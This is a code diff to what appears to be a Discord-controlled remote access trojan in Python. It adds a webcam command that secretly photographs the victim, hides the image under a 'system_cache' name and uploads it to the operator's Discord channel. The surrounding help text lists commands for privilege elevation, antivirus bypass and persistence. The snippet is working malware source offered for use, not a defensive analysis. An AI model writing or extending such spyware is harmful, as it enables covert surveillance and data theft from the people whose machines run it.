@@ -636,7 +636,30 @@ async def su(ctx):
     except Exception as e:
         await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")
 
+@bot.command()
+async def webcam(ctx):
+    try:
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        cam.release()
 
+        if ret:
+            temp_dir = os.path.join(os.getenv('TEMP'), 'system_cache')
+            os.makedirs(temp_dir, exist_ok=True)
+            temp_file = os.path.join(temp_dir, f"cache_{int(time.time())}.png")
+            
+            cv2.imwrite(temp_file, frame)
+            await ctx.send(file=File(temp_file))
+            await ctx.send(f"Foto de la webcam capturada{watermark()}")
+            
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+        else:
+            await ctx.send(f"Error: No se pudo capturar la imagen{watermark()}")
+    except Exception as e:
+        await ctx.send(f"Error accediendo a la webcam: {e}{watermark()}")
 @bot.command()
 async def recent(ctx, browser: str = "chrome"):
     try:
@@ -1071,7 +1094,7 @@ async def help(ctx):
 !su - Request admin privileges
 !avbypass - Bypass antivirus
 !persist - Add persistence
-
+!webcam - Sends a picture from the webcam
 {watermark()}
 """
     await ctx.send(help_text)
